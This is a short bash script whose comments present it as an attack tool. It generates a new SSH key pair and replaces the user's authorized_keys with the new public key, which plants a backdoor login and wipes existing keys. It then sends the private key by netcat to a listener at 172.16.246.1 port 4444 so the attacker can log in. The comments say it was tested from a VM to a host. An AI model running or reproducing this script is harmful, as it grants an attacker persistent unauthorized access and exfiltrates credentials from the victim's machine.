#!/bin/bash

#creates new ssh key, sends new private key back to attacker
#this works pretty well from VM to host right now
#just on host set up nc listen on port to receive key
#as long as ssh enabled no root required?

cd ~
mkdir .ssh
cd .ssh
ssh-keygen -f new_key -N ""
mv new_key.pub authorized_keys
chmod 600 new_key
cat new_key | nc 172.16.246.1 4444 -q 0